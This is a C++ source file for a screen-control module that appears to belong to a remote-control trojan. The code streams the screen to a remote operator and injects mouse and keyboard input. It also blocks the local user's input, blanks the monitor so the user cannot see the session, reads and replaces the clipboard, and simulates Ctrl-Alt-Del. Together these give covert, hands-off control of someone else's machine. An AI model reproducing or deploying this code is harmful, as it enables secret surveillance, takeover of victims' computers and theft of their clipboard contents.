// ScreenManagers.cpp: implementation of the CScreenManagers class.
//
//////////////////////////////////////////////////////////////////////
//#define _WIN32_WINNT	0x0400
#include "ScreenManagers.h"
#include "../until.h"
#include <winable.h> // BlockInput

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenManagers::CScreenManagers(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;
// 	m_biBitCount = 8;
// 	m_pScreenSpy = new CScreenSpy(8);
	m_biBitCount = 3;//默认4位灰度
	m_pScreenSpy = new CScreenSpys(4, true);//默认4位灰度
//	m_biBitCount = 1;//默认1位黑白
//	m_pScreenSpy = new CScreenSpy(1);//默认1位黑白
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}

CScreenManagers::~CScreenManagers()
{
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);

	if (m_pScreenSpy)
		delete m_pScreenSpy;
}

void CScreenManagers::ResetScreen(int biBitCount)
{
// 	char string[25];
// 	itoa(biBitCount,string,10);
// 	OutputDebugString(string);
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	delete m_pScreenSpy;

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpys(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpys(8, true);
	else
		m_pScreenSpy = new CScreenSpys(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}
#include "dwmapi.h"
#pragma comment(lib, "dwmapi.lib")
bool IsCompositionEnabled1()//判断是否开启Aero
{

	HRESULT hr;
	BOOL bEnabled;
	hr = DwmIsCompositionEnabled(&bEnabled);
	return SUCCEEDED(hr)&&bEnabled;
}

void OpenWin7Basic1() // win7屏幕加速~开始
{


	if (IsCompositionEnabled1())
	{
		DwmEnableComposition(0);//关闭basic主题
	}
	else
	{
		DwmEnableComposition(1);//开启basic主题
	}
}
void Win7Basic1() // win7屏幕加速
{
	HMODULE library = LoadLibrary("dwmapi.dll");//没有dwmapi.dll何来的win7/vista
    if (library != NULL)
    {
        if (GetProcAddress(library,"DwmIsCompositionEnabled") != NULL)
        {
			if (GetProcAddress(library,"DwmEnableComposition") != NULL)
			{
				OpenWin7Basic1();
			}
        }
        FreeLibrary(library);
    }
}
void CScreenManagers::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_SCREEN_CONTROL1:
			{
				// 远程仍然可以操作
				BlockInput(false);
				ProcessCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);
//				OutputDebugString("ok");
			}
			break;
		case COMMAND_NEXT1:
			// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET1:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET1:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL1:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_BLOCK_INPUT1: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			BlockInput(m_bIsBlockInput);
			break;
		case COMMAND_SCREEN_BLANK1:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER1:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD1:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD1:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		case COMMAND_WIN7BASIC1:
			Win7Basic1();
			break;
		default:
			break;
		}
	}catch(...){}
}

void CScreenManagers::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO1;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void CScreenManagers::sendFirstScreen()
{
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN1;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManagers::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN1;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);


	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

DWORD WINAPI CScreenManagers::WorkThread(LPVOID lparam)
{
	CScreenManagers *pThis = (CScreenManagers *)lparam;

	pThis->sendBITMAPINFO();
	// 等控制端对话框打开

	pThis->WaitForDialogOpen();

	pThis->sendFirstScreen();
	try // 控制端强制关闭时会出错
    {
		while (pThis->m_bIsWorking)
			pThis->sendNextScreen();
	}catch(...){};

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CScreenManagers::ControlThread(LPVOID lparam)
{
	static	bool bIsScreenBlanked = false;
	CScreenManagers *pThis = (CScreenManagers *)lparam;

	while (pThis->IsConnect())
	{
		// 加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (pThis->IsConnect())
			{
				// 分辨率大小改变了
				if (pThis->IsMetricsChange())
					pThis->ResetScreen(pThis->GetCurrentPixelBits());
				Sleep(10);
			}
			else
				break;
		}
		if (pThis->m_bIsBlankScreen)
		{
 			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			PostMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);
// 			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
 				SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				PostMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)-1);
// 				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}
		BlockInput(pThis->m_bIsBlockInput);
		// 分辨率大小改变了
		if (pThis->IsMetricsChange())
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
	}
	BlockInput(false);

	return -1;
}
#define WM_MOUSEWHEEL 0x020A
#if !defined(GET_WHEEL_DELTA_WPARAM)
#define GET_WHEEL_DELTA_WPARAM(wParam) ((short)HIWORD(wParam))
#endif
bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	szOldDesktop[256], szNewDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(szOldDesktop, 0, sizeof(szOldDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &szOldDesktop, sizeof(szOldDesktop), &dwLengthNeeded);
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(szNewDesktop, 0, sizeof(szNewDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &szNewDesktop, sizeof(szNewDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(szOldDesktop, szNewDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	
	CloseDesktop(hOldDesktop);
	CloseDesktop(hNewDesktop);
	return bRet;
}
void CScreenManagers::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	// 数据包不合法
	if (nSize % sizeof(MSG) != 0)
		return;

	SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / sizeof(MSG);

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		BlockInput(false);
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
			case WM_LBUTTONDOWN:
			case WM_LBUTTONUP:
			case WM_RBUTTONDOWN:
			case WM_RBUTTONUP:
			case WM_MOUSEMOVE:
			case WM_LBUTTONDBLCLK:
			case WM_RBUTTONDBLCLK:
			case WM_MBUTTONDOWN:
			case WM_MBUTTONUP:
				{
					POINT point;
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);
					SetCursorPos(point.x, point.y);
					SetCapture(WindowFromPoint(point));
				}
				break;
			default:
				break;
		}

		switch(pMsg->message)
		{
			case WM_LBUTTONDOWN:
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;
			case WM_LBUTTONUP:
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;
			case WM_RBUTTONDOWN:
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;
			case WM_RBUTTONUP:
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;
 			case WM_LBUTTONDBLCLK:
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;
 			case WM_RBUTTONDBLCLK:
 				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONDOWN:
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONUP:
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
				break;
			case WM_MOUSEWHEEL:
				mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
				break;
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
				break;	
			case WM_KEYUP:
			case WM_SYSKEYUP:
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
				break;
			default:
				break;
		}
	}	
}

void CScreenManagers::UpdateLocalClipboard( char *buf, int len )
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenManagers::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT1;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


// 屏幕分辨率是否发生改变
bool CScreenManagers::IsMetricsChange()
{
	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();

	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || 
		(lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
}

bool CScreenManagers::IsConnect()
{
	return m_pClient->IsRunning();
}

int CScreenManagers::GetCurrentPixelBits()
{
	return m_biBitCount;
}